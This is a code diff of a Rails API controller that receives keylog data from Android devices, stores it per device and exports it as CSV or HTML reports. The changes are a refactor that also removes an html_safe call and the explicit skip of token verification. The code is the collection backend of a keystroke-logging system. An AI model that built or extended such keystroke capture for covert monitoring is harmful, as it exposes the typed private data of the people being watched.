@@ -1,8 +1,7 @@
 # frozen_string_literal: true
 
 module Api
-  class KeyloggerController < ApplicationController
-    skip_before_action :verify_authenticity_token
+  class KeyloggerController < Api::BaseController
 
     # POST /api/keylogger - Receive keylog data from Android client
     def receive
@@ -14,11 +13,9 @@ module Api
         return
       end
 
-      # Find or create smartphone by device_id
-      smartphone = Smartphone.find_or_create_by(device_id: device_id) do |phone|
-        phone.name = "Device #{device_id[0..7]}"
-        phone.operating_system = 'Android'
-      end
+      # Find or create smartphone using the concern method
+      smartphone = find_or_create_smartphone(device_id)
+      return render json: { error: 'Failed to create device' }, status: :internal_server_error unless smartphone
 
       # Process keylog data
       processor = KeylogProcessor.new(keylog_data)
@@ -104,7 +101,7 @@ module Api
       when 'csv'
         send_data processor.to_csv, filename: "keylog_#{device_id}_#{Time.current.to_i}.csv", type: 'text/csv'
       when 'html'
-        render html: processor.to_html_report.html_safe
+        render html: processor.to_html_report
       else
         render json: { error: 'Invalid format (use csv or html)' }, status: :bad_request
       end
